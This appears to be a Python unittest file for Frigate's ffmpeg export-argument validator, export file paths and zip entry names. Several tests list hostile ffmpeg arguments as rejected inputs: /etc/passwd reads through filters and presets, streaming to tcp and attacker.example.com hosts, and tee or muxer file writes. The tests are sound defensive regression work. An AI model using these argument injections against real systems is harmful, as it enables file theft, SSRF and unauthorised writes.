import unittest
from pathlib import Path

from frigate.api.export import _unique_archive_name
from frigate.models import Export
from frigate.record.export import export_video_path, validate_ffmpeg_args


class TestValidateFfmpegArgs(unittest.TestCase):
    """Tests for the non-admin custom export ffmpeg arg validator.

    The validator uses a structural allowlist: every token must be an
    allowlisted flag or the value of one, filter values are restricted to a
    safe set of filters, and no token may become a bare input/output URL.
    """

    def assertRejected(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertFalse(valid, f"expected {args!r} to be rejected")
        self.assertNotEqual(message, "")

    def assertAllowed(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertTrue(valid, f"expected {args!r} to be allowed, got: {message}")
        self.assertEqual(message, "")

    # --- legitimate use cases must keep working ---------------------------

    def test_timelapse_setpts_allowed(self):
        # The whole reason -vf cannot simply be blocked: timelapse exports.
        self.assertAllowed("-vf setpts=PTS/60 -r 25")
        self.assertAllowed("-vf setpts=0.04*PTS -r 30")  # server default
        self.assertAllowed("-filter:v setpts=PTS/60 -r 25")

    def test_default_input_args_allowed(self):
        self.assertAllowed("")
        self.assertAllowed("-an -skip_frame nokey")

    def test_encoding_args_allowed(self):
        self.assertAllowed("-c:v libx264 -crf 23 -preset fast")
        self.assertAllowed("-c:v copy -c:a copy")
        self.assertAllowed("-c:v libx264 -b:v 2M -maxrate 2M -bufsize 4M")
        self.assertAllowed("-movflags +faststart")
        self.assertAllowed("-pix_fmt yuv420p -r 30 -g 30")

    def test_safe_filters_allowed(self):
        self.assertAllowed("-vf scale=640:480")
        self.assertAllowed("-vf scale=640:480,setpts=0.5*PTS")
        self.assertAllowed("-vf format=yuv420p")
        self.assertAllowed("-vf transpose=1")
        self.assertAllowed("-vf hflip")
        self.assertAllowed("-vf fps=15")
        self.assertAllowed("-vf setsar=1 -an")
        self.assertAllowed("-vf setdar=16/9")

    # --- the reported advisory and file-read class ------------------------

    def test_reported_advisory_rejected(self):
        self.assertRejected(
            "-filter:v drawtext=textfile=/etc/passwd:fontcolor=white:fontsize=20"
        )

    def test_file_reading_filters_rejected(self):
        self.assertRejected("-vf movie=/etc/passwd")
        self.assertRejected("-vf drawtext=textfile=/etc/passwd")
        self.assertRejected("-vf subtitles=/etc/passwd")
        # marker embedded as an option of an otherwise-allowed filter name
        self.assertRejected("-vf scale=movie=/etc/passwd")

    def test_filtergraph_brackets_rejected(self):
        # link labels aren't needed for safe filters; rejecting "[" / "]" keeps
        # filtergraph validation linear (no ReDoS on attacker input)
        self.assertRejected("-vf [in]scale=640:480[out]")
        self.assertRejected("-vf " + "[" * 5000)

    def test_preset_file_read_rejected(self):
        # cwd-anchored traversal slipped past the old startswith() path check
        self.assertRejected("-fpre frigate/../../../etc/passwd")
        self.assertRejected("-fpre evil.preset")
        self.assertRejected("-vpre x")
        self.assertRejected("-apre x")
        self.assertRejected("-pre x")

    def test_slash_option_file_read_rejected(self):
        # ffmpeg "-/option file" reads the option value from a file
        self.assertRejected("-/filter:v graph.txt")
        self.assertRejected("-/filter_complex graph.txt")

    # --- network / SSRF class ---------------------------------------------

    def test_schemeless_protocol_rejected(self):
        self.assertRejected("-f mpegts tcp:10.0.0.5:4444")
        self.assertRejected("tcp:10.0.0.5:4444")
        self.assertRejected("udp:10.0.0.5:4444")
        self.assertRejected("-progress http:attacker.example.com:80/p")

    # --- file-write class --------------------------------------------------

    def test_tee_write_rejected(self):
        self.assertRejected("-c:v libx264 -map 0 -f tee [f=mpegts]/tmp/owned.ts")
        self.assertRejected("-f tee [f=mpegts]/etc/frigate/x.ts")
        self.assertRejected("tee:/tmp/x")

    def test_bare_output_token_rejected(self):
        self.assertRejected("evil.mp4")
        self.assertRejected("-c copy evil.mp4")
        self.assertRejected("x/../escaped.mkv")

    def test_file_producing_muxers_rejected(self):
        self.assertRejected("-f hls -hls_segment_filename pwn%03d.ts out.m3u8")
        self.assertRejected("-f md5 victim.txt")
        self.assertRejected("-f segment seg%03d.ts")

    def test_write_flags_rejected(self):
        self.assertRejected("-progress evil.log")
        self.assertRejected("-stats_enc_pre evil.csv")
        self.assertRejected("-report")

    # --- resource exhaustion / misc ---------------------------------------

    def test_dos_input_flags_rejected(self):
        self.assertRejected("-stream_loop -1")
        self.assertRejected("-readrate 0.001")

    def test_disallowed_flags_rejected(self):
        self.assertRejected("-map 0")
        self.assertRejected("-i /etc/passwd")
        self.assertRejected("-attach evil.bin")
        self.assertRejected("-dump_attachment evil.bin")
        self.assertRejected("/etc/passwd")
        self.assertRejected("-metadata comment=x")


class TestExportVideoPath(unittest.TestCase):
    """Tests for the file path an export takes once the user names it."""

    EXPORT_ID = "front_door_abc123"

    def test_uses_the_name_the_user_gave(self):
        self.assertEqual(
            export_video_path("Package thief", self.EXPORT_ID),
            "/media/frigate/exports/Package thief_abc123.mp4",
        )

    def test_id_suffix_keeps_shared_names_apart(self):
        self.assertNotEqual(
            export_video_path("clip", "front_door_abc123"),
            export_video_path("clip", "front_door_def456"),
        )

    def test_long_names_fit_the_filesystem_limit(self):
        # Names are capped in bytes, not characters: 244 CJK characters is
        # under any character cap and still 732 bytes on disk.
        for name in ("A" * 256, "\u76e3" * 256, "\U0001f3a5" * 100):
            file_name = Path(export_video_path(name, self.EXPORT_ID)).name
            self.assertLessEqual(len(file_name.encode()), 255)

    def test_truncation_keeps_the_name_decodable(self):
        file_name = Path(export_video_path("\u76e3" * 256, self.EXPORT_ID)).name
        self.assertTrue(file_name.endswith("_abc123.mp4"))
        self.assertNotIn("\ufffd", file_name)

    def test_stays_inside_the_export_dir(self):
        for name in ("../../etc/passwd", "..", "a/b", "...", ""):
            path = Path(export_video_path(name, self.EXPORT_ID))
            self.assertEqual(str(path.parent), "/media/frigate/exports")


class TestUniqueArchiveName(unittest.TestCase):
    """Tests for zip entry names in a case download.

    Entries use the on-disk file name, which is also what an individual
    download produces, so the two can't drift.
    """

    def build_export(self, video_path: str) -> Export:
        return Export(
            id="front_door_abc123",
            camera="front_door",
            name="whatever the display name is",
            date=1756000000.0,
            video_path=video_path,
            thumb_path=video_path.replace(".mp4", ".webp"),
            in_progress=False,
        )

    def test_uses_the_on_disk_file_name(self):
        export = self.build_export(
            "/media/frigate/exports/front_door_20260823_020615-20260823_020734_abc123.mp4"
        )
        self.assertEqual(
            _unique_archive_name(export, set()),
            "front_door_20260823_020615-20260823_020734_abc123.mp4",
        )

    def test_follows_a_renamed_file(self):
        export = self.build_export("/media/frigate/exports/Package thief_abc123.mp4")
        self.assertEqual(
            _unique_archive_name(export, set()), "Package thief_abc123.mp4"
        )

    def test_entries_are_deduplicated(self):
        export = self.build_export("/media/frigate/exports/Package thief_abc123.mp4")
        used: set[str] = set()
        self.assertEqual(_unique_archive_name(export, used), "Package thief_abc123.mp4")
        self.assertEqual(
            _unique_archive_name(export, used), "Package thief_abc123_1.mp4"
        )


if __name__ == "__main__":
    unittest.main()
